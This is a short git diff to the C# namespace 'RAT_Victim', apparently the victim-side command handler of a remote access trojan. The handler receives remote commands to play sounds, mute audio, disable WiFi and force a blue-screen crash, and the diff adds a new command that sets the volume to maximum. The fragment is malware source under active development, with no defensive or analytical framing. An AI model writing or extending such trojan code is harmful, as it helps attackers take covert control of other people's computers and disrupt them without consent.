@@ -57,7 +57,7 @@ namespace RAT_Victim
                         Commands.PlaySound(new MemoryStream(buffer, 1, byteCount));
                         break;
                     case RatCommand.Mute:
-                        WinApi.keybd_event(Keys.VolumeMute, 0, 0, 0);
+                        WinApi.keybd_event(ConsoleKey.VolumeMute, 0, 0, 0);
                         break;
                     case RatCommand.DisableWiFi:
                         Commands.DisableWiFi();
@@ -67,6 +67,9 @@ namespace RAT_Victim
                         break;
                     case RatCommand.Bsod:
                         Commands.Bsod();
+                        break;
+                    case RatCommand.MaxVolume:
+                        Commands.MaxVolume();
                         break;
                     default:
                         throw new ArgumentOutOfRangeException();
